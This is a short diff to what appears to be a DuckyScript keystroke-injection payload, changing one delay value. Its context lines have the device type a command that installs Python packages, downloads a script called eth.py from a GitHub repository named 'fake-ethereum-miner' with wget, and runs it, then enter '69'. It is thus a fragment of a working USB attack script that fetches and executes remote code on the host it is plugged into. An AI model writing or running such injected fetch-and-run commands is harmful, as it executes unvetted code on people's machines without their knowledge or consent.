@@ -15,7 +15,7 @@ DELAY 2000
 STRING pip3 install pystyle colorama numpy && wget https://github.com/3POPPE/fake-ethereum-miner/raw/main/eth.py && python3 eth.py
 DELAY 300
 ENTER
-DELAY 8000
+DELAY 10000
 STRING 69
 DELAY 300
 ENTER
